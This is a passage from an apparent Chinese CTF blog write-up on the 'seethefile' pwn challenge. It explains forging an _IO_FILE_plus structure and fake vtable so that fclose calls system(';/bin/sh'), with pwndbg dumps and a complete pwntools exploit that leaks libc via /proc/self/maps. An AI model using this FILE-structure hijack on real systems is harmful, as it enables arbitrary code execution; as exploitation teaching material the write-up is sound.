.got.plt:off_804B028↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A8 ; char *strchr(const char *s, int c)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A8                 extrn strchr:near       ; CODE XREF: _strchr↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A8                                         ; DATA XREF: .got.plt:off_804B02C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC                 extrn __libc_start_main:near</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC                                         ; CODE XREF: ___libc_start_main↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC                                         ; DATA XREF: .got.plt:off_804B030↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B0 ; int setvbuf(FILE *stream, char *buf, int modes, size_t n)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B0                 extrn setvbuf:near      ; CODE XREF: _setvbuf↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B0                                         ; DATA XREF: .got.plt:off_804B034↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B4 ; FILE *fopen(const char *filename, const char *modes)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B4                 extrn fopen:near        ; CODE XREF: _fopen↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B4                                         ; DATA XREF: .got.plt:off_804B038↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B8 ; void *memset(void *s, int c, size_t n)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B8                 extrn memset:near       ; CODE XREF: _memset↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B8                                         ; DATA XREF: .got.plt:off_804B03C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2BC                 extrn __isoc99_scanf:near</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2BC                                         ; CODE XREF: ___isoc99_scanf↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2BC                                         ; DATA XREF: .got.plt:off_804B040↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C0 ; int atoi(const char *nptr)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C0                 extrn atoi:near         ; CODE XREF: _atoi↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C0                                         ; DATA XREF: .got.plt:off_804B044↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                 extrn __imp___gmon_start__:near ; weak</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                                         ; CODE XREF: __gmon_start__↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                                         ; DATA XREF: .got:__gmon_start___ptr↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                 end _start</span></span><br></pre></td></tr></table></figure>\n<p>我们产看内存空间发现，在 fp 后有足够多的空间来放我们的 fake_file（虽然 filename 也很大，但是文件名只可以读取 63 字节）. 所以我们将 file 放在此处，同时伪造的时候要注意如何跳过 fclose 的一些检查：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class=\"line\">    _IO_un_link ((<span class=\"keyword\">struct</span> _IO_FILE_plus *) fp);</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_acquire_lock (fp);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class=\"line\">    status = _IO_file_close_it (fp);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class=\"number\">-1</span> : <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_release_lock (fp);</span><br><span class=\"line\">  _IO_FINISH (fp);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//可以看到当_IO_IS_FILEBUF位为0时，函数不会执行_IO_un_link和_IO_file_close_it函数，而直接执行_IO_FINISH函数。在_IO_FINISH函数中会直接调用vtable中的__finish函数。其中_IO_IS_FILEBUF被定义为0x2000。_flags &amp; 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)；对于不同的函数，检查可能时不一样的，这就需要libc源码分析了。</span></span><br><span class=\"line\"><span class=\"comment\">//此外还有其他的绕过方法</span></span><br><span class=\"line\"><span class=\"comment\">//这里我并不清楚这些绕过都是什么，待后续学习</span></span><br><span class=\"line\"><span class=\"number\">1.</span>((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"comment\">//或者是</span></span><br><span class=\"line\"><span class=\"number\">2.</span></span><br><span class=\"line\">_IO_vtable_offset (fp) == <span class=\"number\">0</span> </span><br><span class=\"line\">&amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> </span><br><span class=\"line\">&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">   </span><br><span class=\"line\">flag&amp;<span class=\"number\">8</span> = <span class=\"number\">0</span> and flag &amp;<span class=\"number\">2</span> =<span class=\"number\">0</span> and flag &amp; <span class=\"number\">0x8000</span> != <span class=\"number\">0</span></span><br><span class=\"line\">所以flag的值可以为<span class=\"number\">0xfbad8000</span> 或者<span class=\"number\">0xfbad8080</span></span><br><span class=\"line\">  <span class=\"comment\">//unlink与io_FILE_plus 联合使用https://www.jianshu.com/p/1e45b785efc1</span></span><br></pre></td></tr></table></figure>\n<p>在执行 fclose 时会执行 unlink 等一些操作，同时会 free 我们开启的 fp 堆块以及储存数据的堆块，如果因为这两个堆块都比较大，检查是否与 topchunk 相邻，然年进行 free, 因为储存数据的堆块与 topchunk 相连，而且其在 file 堆块前释放，所以两个都会合并到 topchunk.fclose 会对 file_plus 的数据进处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72539124</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>继续我们上述的绕过检查，我们修改其的相关参数后释放</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x804c408</span> PREV_INUSE &#123;\t\t\t\t\t<span class=\"comment\">//IO_FILE_plus 堆块</span></span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">353</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0xf7fb77b0</span> &lt;main_arena+<span class=\"number\">48</span>&gt;, </span><br><span class=\"line\">  bk = <span class=\"number\">0xf7fb77b0</span> &lt;main_arena+<span class=\"number\">48</span>&gt;, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x804c570</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x804c570</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804c568</span> &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">352</span>, </span><br><span class=\"line\">  size = <span class=\"number\">4104</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0xa6161</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804d570</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">129681</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">5</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-134514768</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0xf7fb77b0</span> &lt;main_arena+<span class=\"number\">48</span>&gt; <span class=\"string\">&quot;p\\325\\004\\b&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x804d570</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到，此时只是对 file 堆块进行了释放，而没有对其数据进行清空，io_read_ptr 变为了 main_arena, 这是因为其加入了 unsortedbins, 但是这块是或否执行了 unlink 操作呢？但是我们看到了储存数据的堆块并没有进行 free 操作。这里这样操作，如果存在 UAF 是否可以实现泄露数据呢？</p>\n<p>泄露地址的操作，在进行数据泄露的时候除了程序的内存表，还可以利用环境的相关内容。通过打开 /proc/self/mmap 这个虚拟文件来获取当前进程的地址空间情况，</p>\n</li>\n<li></li>\n</ol>\n<p>整体思路：1. 泄露 libc 地址，获取 system 函数的真实地址</p>\n<p>​\t2. 利用 fp 后面的 bss 伪造 file_plus 的结构体（）这部分内存全是空的</p>\n   <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name:<span class=\"number\">0x0</span>,\t\t\t\t<span class=\"comment\">//0x20字节</span></span><br><span class=\"line\">\t<span class=\"number\">0x0</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x0</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x0</span>,</span><br><span class=\"line\">fp:fake_file_start </span><br><span class=\"line\"><span class=\"comment\">//下面时伪造的file</span></span><br><span class=\"line\">flags_:<span class=\"number\">0xffffdfff</span>\t\t\t<span class=\"comment\">//fake_file_start</span></span><br><span class=\"line\">_io_read_ptr:<span class=\"string\">&quot;;/bin/sh&quot;</span></span><br><span class=\"line\"><span class=\"comment\">//下面就可以全是0</span></span><br><span class=\"line\">vtable:fake_file_start+<span class=\"number\">0x94</span>+<span class=\"number\">4</span> </span><br><span class=\"line\"><span class=\"comment\">//fake_vatable   fclose偏移为2</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy)：<span class=\"number\">0</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy2)）：<span class=\"number\">0</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish)：system_addr</span><br><span class=\"line\"> <span class=\"comment\">//剩下的全写0</span></span><br></pre></td></tr></table></figure>\n<p>调用_IO_FINSH (fp)，_IO_FINISH (fp) 相当于调用 fp-&gt;vtabl-&gt;__finish (fp)，此时实际上执行的 system (fp);</p>\n<p>因此此时的 fp 指针其实就是 system 的参数，虽然 fp 并未直接指向 &quot;/bin/sh&quot;, 但是 system 解析指令的时，无法解析 0xffffdfff，便会继续向后检查，这里除了写”;bin/sh“, 话可以有”||/bin/sh“, 覆盖后面的指针也问题不大</p>\n<h2 id=\"补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移\"><a class=\"markdownIt-Anchor\" href=\"#补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移\">#</a> 补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现 vtable 指针的改写，是因为数据过长后，到了 bss 下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是 io_file 里面 的_offset 变量，一定要是我们 fp 指针的 + 4 偏移</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./seethefile&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&quot;./seethefile&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">name = <span class=\"number\">0x804B260</span></span><br><span class=\"line\">fp = <span class=\"number\">0x804B280</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span> ,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">open_file</span>(<span class=\"params\">file_path</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;What do you want to see :&quot;</span>,file_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">open_file(<span class=\"string\">&quot;/proc/self/maps&quot;</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;[heap]\\n&quot;</span>)</span><br><span class=\"line\">libc_base = <span class=\"built_in\">int</span>(<span class=\"string\">b&quot;0x&quot;</span>+r.recv(<span class=\"number\">8</span>),<span class=\"number\">16</span>)+<span class=\"number\">0x1000</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">system_addr = libc.sym[<span class=\"string\">&#x27;system&#x27;</span>] + libc_base</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x01\\xA0;/bin/sh\\x00\\x00&#x27;</span>+p32(system_addr)+p32(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p32(name)</span><br><span class=\"line\">payload +=p32(<span class=\"number\">0xcafebabe</span>)*<span class=\"number\">5</span> + p32(<span class=\"number\">0xffffffff</span>) + p32(<span class=\"number\">0xcafebabe</span>)*<span class=\"number\">4</span> +p32(name+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload =payload.ljust(<span class=\"number\">0x94</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p32(<span class=\"number\">0x0804b264</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b *0x08048AF5&#x27;</span>)</span><br><span class=\"line\">ch(<span class=\"number\">5</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Leave your name :&quot;</span>,payload)</span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>总结：这个文章内容比较多，但是重点就在与 io_file_plus 以及虚表的使用，有时候较低的版本可以不去伪造 vtable, 而时可以直接修改 vtable 的数据，但是当下的新版本不在可以。对于不同的函数有不同的利用姿势。、</p>\n",
            "tags": [
                "writeup"
            ]
        }
    ]
}